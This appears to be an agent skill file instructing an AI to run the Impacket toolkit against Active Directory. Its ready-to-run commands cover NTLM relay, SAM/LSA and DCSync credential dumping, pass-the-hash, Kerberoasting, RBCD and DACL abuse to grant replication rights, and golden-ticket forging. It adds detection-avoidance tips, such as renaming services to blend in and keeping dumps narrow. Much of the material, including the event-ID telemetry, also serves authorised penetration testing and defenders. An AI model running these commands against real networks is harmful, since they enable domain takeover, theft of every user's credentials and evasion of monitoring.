---
name: impacket
description: "Drive the Impacket suite for NTLM relay, secrets dumping, delegation and RBCD abuse, and Kerberos ticket workflows. Use when you need per-service control over SMB, LDAP, DRSUAPI or Kerberos that a scanner hides. Not for broad host triage (use netexec) or AD CS abuse (use certipy)."
---

# Impacket

Impacket is a Python library with roughly seventy console entry points, each one a single attack primitive: relay, dump, exec, forge, abuse a delegation flag. Nothing is abstracted away, so you see the protocol exchange and you choose the artefact. That control is also the cost: every script is timed and logged by the target.

On this host the suite is installed twice. The pipx venv at `~/.local/bin` holds **0.13.1** and its entry points are named `secretsdump.py`, `ntlmrelayx.py`, `psexec.py` and so on. The distro package also ships `/usr/bin/impacket-secretsdump` at **0.11.0**; only a subset exists there and `impacket-ntlmrelayx` does not exist at all. `~/.local/bin` precedes `/usr/bin` on PATH, so bare `secretsdump.py` is the 0.13.1 one. Call `python3 -m impacket.examples.<script>` only as a last resort.

## When to use

| Goal | Entry point | Shape |
| --- | --- | --- |
| Relay coerced or poisoned NTLM auth | `ntlmrelayx.py` | `ntlmrelayx.py -tf targets.txt -smb2support` |
| Dump SAM, LSA, cached creds, NTDS | `secretsdump.py` | `secretsdump.py dom/u:p@host` |
| Replicate only one account | `secretsdump.py` | `-just-dc-user krbtgt` |
| Semi-interactive shell over WMI | `wmiexec.py` | `wmiexec.py dom/u:p@host` |
| Service-based shell | `psexec.py` / `smbexec.py` | `psexec.py dom/u:p@host cmd.exe` |
| Scheduled-task exec, no service | `atexec.py` | `atexec.py dom/u:p@host whoami` |
| Kerberoast / AS-REP roast | `GetUserSPNs.py` / `GetNPUsers.py` | `-request` |
| Get a TGT or ST from creds | `getTGT.py` / `getST.py` | writes a ccache |
| Forge golden or silver ticket | `ticketer.py` | `-domain -domain-sid -nthash` |
| Read or write RBCD | `rbcd.py` | `-action write` |
| Read or write a DACL | `dacledit.py` | `-action write -rights DCSync` |
| Take ownership of an object | `owneredit.py` | `-action write` |
| Child domain to forest | `raiseChild.py` | `dom/childadmin:pw` |
| Name RIDs to users | `lookupsid.py` | `dom/u:p@host 4000` |
| RPC endpoint map | `rpcdump.py` | `rpcdump.py dom/u:p@host` |
| Browse shares interactively | `smbclient.py` | `smbclient.py dom/u:p@host` |
| SQL shell with Windows auth | `mssqlclient.py` | `mssqlclient.py -windows-auth dom/u:p@host` |

## Prerequisites

- Kerberos needs a clock within five minutes of the KDC and a resolvable FQDN; use `-dc-ip` and add the DC to `/etc/hosts` rather than trusting DNS.
- `KRB5CCNAME` selects the credential cache. Export it in the shell, not per command, so every child process sees the same ticket.
- Relay requires a listener the victim will talk to: SMB 445, HTTP 80, or an IPv6/WPAD trigger. Check no local service already binds those ports.
- DCSync needs replication rights; local admin alone is insufficient.
- Wordlists: `/opt/wordlists/users-top.txt`, `pass-top1m.txt`, `rockyou.txt`.

## Core invocations

Relay first, because it needs no valid credential.

Relay has two halves: something that makes a victim authenticate to you, and something that forwards that authentication to a target. `ntlmrelayx.py` is the second half. Responder is the usual first half: it answers LLMNR, NBT-NS and mDNS, and you turn off its own SMB and HTTP servers in `Responder.conf` so that `ntlmrelayx.py` keeps the bind on 445 and 80. Responder is not installed on this host; `mitm6` is, and covers the IPv6 and WPAD variant. Nothing below depends on which poisoner you use.

```sh
# 1. find hosts with SMB signing disabled, then relay to them
nxc smb 10.10.0.0/24 --gen-relay-list relay-targets.txt

# 2. relay every inbound auth to the target list, dumping SAM on success
ntlmrelayx.py -tf relay-targets.txt -smb2support -l loot/ -of loot/hashes

# 3. relay to LDAP and escalate the relayed account instead of dumping
ntlmrelayx.py -t ldap://dc01.corp.local -smb2support --escalate-user svc-backup

# 4. relay to AD CS web enrollment (ESC8); pair with a coerced auth
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# 5. keep a SOCKS foothold on every successful relay session
ntlmrelayx.py -tf relay-targets.txt -smb2support -socks -socks-port 1080

# 6. dump local secrets from an admin context
secretsdump.py corp.local/alice:'Winter2026!'@10.10.10.5

# 7. pass-the-hash variant, with history and password age
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
  -history -pwd-last-set corp.local/alice@10.10.10.5

# 8. DCSync: everything, or one account
secretsdump.py -just-dc corp.local/alice@dc01.corp.local
secretsdump.py -just-dc-user krbtgt corp.local/alice@dc01.corp.local

# 9. parse hives offline after pulling them by other means
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

Kerberos and delegation.

```sh
# 10. ticket from a password or hash, then use it everywhere
getTGT.py corp.local/alice:'Winter2026!' -dc-ip 10.10.10.10
export KRB5CCNAME=$PWD/alice.ccache

# 11. Kerberoast, then AS-REP roast accounts without preauth
GetUserSPNs.py corp.local/alice -k -no-pass -dc-ip 10.10.10.10 \
  -request -outputfile kerb.txt
GetNPUsers.py corp.local/ -usersfile /opt/wordlists/users-top.txt \
  -request -format hashcat -outputfile asrep.txt

# 12. S4U2Self plus S4U2Proxy for constrained delegation
getST.py -spn cifs/files01.corp.local -impersonate administrator \
  corp.local/svc-sql:'Winter2026!' -dc-ip 10.10.10.10

# 13. RBCD: grant a controlled computer the right to impersonate, then use it
rbcd.py -delegate-to dc01$ -delegate-from attacker$ -action write \
  corp.local/alice:'Winter2026!'
getST.py -spn cifs/dc01.corp.local -impersonate administrator \
  corp.local/attacker$:'MachinePass123!'

# 14. write DCSync rights onto your own principal
dacledit.py -action write -rights DCSync -principal alice -target-dn \
  'DC=corp,DC=local' corp.local/alice:'Winter2026!'

# 15. forge a golden ticket from the krbtgt hash
ticketer.py -nthash <krbtgt-nt-hash> -domain-sid S-1-5-21-1-2-3 \
  -domain corp.local administrator
```

## Flags that matter

| Flag | Scripts | Effect |
| --- | --- | --- |
| `-tf` / `-t` | ntlmrelayx | target file / single relay target; `ldap://` and `http://` change the attack |
| `-smb2support` | ntlmrelayx | speaking SMB2/3; required on anything modern |
| `--adcs` + `--template` | ntlmrelayx | request a certificate for the relayed machine or user |
| `--escalate-user` | ntlmrelayx | LDAP relay path: grant your account DA via ACLs |
| `--shadow-credentials` / `--shadow-target` | ntlmrelayx | write `msDS-KeyCredentialLink` instead of dumping |
| `-socks` | ntlmrelayx | hold sessions; use `proxychains` afterwards |
| `--remove-mic` | ntlmrelayx | strip MIC for CVE-2019-1040 cross-protocol relay |
| `-just-dc-user` / `-ldapfilter` | secretsdump | scope replication; far quieter than a full dump |
| `-use-vss` + `-exec-method` | secretsdump | VSS path when DRSUAPI is blocked |
| `-history` | secretsdump | include password history in NTDS output |
| `-outputfile` | secretsdump | split results into `.sam`, `.secrets`, `.ntds` files |
| `-hashes` | all | pass-the-hash, format `LM:NT` or bare NT |
| `-k -no-pass` | all | use the ccache in `KRB5CCNAME` |
| `-aesKey` | all | AES128/256 key, survives RC4 deprecation |
| `-dc-ip` | all | pin the DC when DNS is unreliable |
| `-impersonate` | getST, ticketer | S4U2Self target; with `ticketer` makes a Sapphire ticket |
| `-altservice` | getST | rewrite the sname so one ST serves many services |
| `-service-name` | psexec, smbexec | rename the created service to blend in |
| `-share` | wmiexec, smbexec | output share; `C$` and `ADMIN$` behave differently |
| `-session-id` | atexec | run inside an existing logon session, no `cmd.exe` |
| `-action` | rbcd, dacledit, owneredit | `write` to abuse, `read` to audit, `remove`/`flush` to clean up |

## Workflow

1. **Recon without credentials.** `lookupsid.py` and `rpcdump.py` are read-only SMB/RPC calls; they map accounts and services before you touch a shell.
2. **Relay before you spray.** Coerce or poison, then let `ntlmrelayx.py` convert machine accounts into certificates, sessions or ACL rights. Machine accounts are what make relay pay.
3. **Dump narrow, then wide.** Start with `-just-dc-user` on a service account, keep the output, then decide whether a full `-just-dc` is worth the 4662 trail.
4. **Move on the directory.** `rbcd.py`, `dacledit.py`, `owneredit.py` all write to AD; each one is a 5136 event you cannot undo silently, so record the previous state (`-action read`) first.
5. **Forging is last.** Only `ticketer.py` gives you a ticket that outlives the password reset; keep the krbtgt hash and the domain SID together.
6. **Clean up.** Remove RBCD entries, DACL ACEs and computer accounts you created; a leftover `attacker$` is a permanent IOC.

## OPSEC and telemetry

- `psexec.py` writes a service binary to `ADMIN$`, creates a service (7045, plus 4697 if audit policy allows) and deletes the service afterwards. `smbexec.py` avoids the binary but still creates a service. `wmiexec.py` leaves `WmiPrvSE.exe` parented processes and 4688 with the full command line.
- `atexec.py` registers a scheduled task (4698, task XML on disk under `C:\Windows\System32\Tasks`); `-session-id` removes the `cmd.exe` child but not the task.
- Every SMB connection is 4624 type 3 on the target. Hash logons increment 4624 with `Authentication Package: NTLM` and land in 4776 on the DC.
- `secretsdump.py` against a DC uses DRSUAPI: 4662 with the replication GUIDs (`1131f6aa-*` for DS-Replication-Get-Changes, `1131f6ad-*` for -All) is the canonical DCSync detection. SAM and LSA reads need no such event, only remote registry or service access.
- `ntlmrelayx.py` produces 4624 type 3 sessions sourced from *your* IP but authenticated as the victim, plus authentication failures 4625 en masse while it works the target list. SOCKS sessions stay open and keep generating traffic.
- Kerberoasting is 4769 with `Ticket Encryption Type: 0x17` (RC4); AS-REP roasting is 4768 with preauth disabled. Both are high-volume if you request every SPN.
- RBCD writes are 5136 on the target computer object (`msDS-AllowedToActOnBehalfOfOtherIdentity`). DCSync rights grants are 5136 on the domain object. Shadow credentials are 5136 on `msDS-KeyCredentialLink`.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `NT_STATUS_ACCESS_DENIED` on psexec | admin but no service-creation right, or AV removed the binary | try `wmiexec.py` or `atexec.py` |
| `rpc_s_access_denied` from secretsdump | no local admin / no replication rights | check with `-just-dc-user`; use `nxc smb --sam` for SAM only |
| `KRB_AP_ERR_SKEW` or `KRB_AP_ERR_MODIFIED` | clock drift, or SPN mismatch | `chronyc makestep`; add the FQDN to `/etc/hosts` |
| `Could not find a valid ticket` | `KRB5CCNAME` unset or pointing at another shell's file | export the absolute path |
| `impacket-ntlmrelayx: command not found` | distro wrappers are incomplete | use `ntlmrelayx.py` from `~/.local/bin` |
| Relay succeeds then dumps nothing | target requires SMB signing, or the relayed account is not admin | check `nxc smb --gen-relay-list` output; relay LDAP or HTTP instead |
| `getST` returns `KDC_ERR_BADOPTION` | delegation not configured for that SPN, or protocol transition blocked | verify with `findDelegation.py`; try `-force-forwardable` |
| `rbcd.py` write denied | no `WriteProperty` on the target object | get ownership first with `owneredit.py`, then re-ACL with `dacledit.py` |
| Hash format rejected | LM:NT reversed or truncated | always `LMHASH:NTHASH`, empty LM as `:NTHASH` |

## Verification

```sh
secretsdump.py --help | head -3     # Impacket v0.13.1
ntlmrelayx.py --help | head -3      # same banner; confirms the pipx entry point
which -a secretsdump.py             # /root/.local/bin first, /usr/bin second
head -1 "$(which secretsdump.py)"   # shebang into the pipx venv interpreter
```

Expect `Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies` and a shebang ending in `pipx/venvs/impacket/bin/python`. Do not use `python3 -c "import impacket"` to check the version: the system interpreter resolves the distro copy at `/usr/lib/python3/dist-packages/impacket`, which is 0.11.0 and disagrees with the entry points. Keep the exact command line, the target, and the script's own log lines (`[*]`, `[+]`, `[-]`) as evidence; they carry the timestamps that matter for a report.

## Related skills

- [netexec](../netexec/SKILL.md) for spraying and host triage before per-service work
- [certipy](../certipy/SKILL.md) for AD CS templates and certificate auth
- [bloodhound-python](../bloodhound-python/SKILL.md) to graph the delegation edges you find here
- [enum4linux-ng](../enum4linux-ng/SKILL.md) for unauthenticated SMB and LDAP enumeration
- [evil-winrm](../evil-winrm/SKILL.md) once you have a working credential and want an interactive shell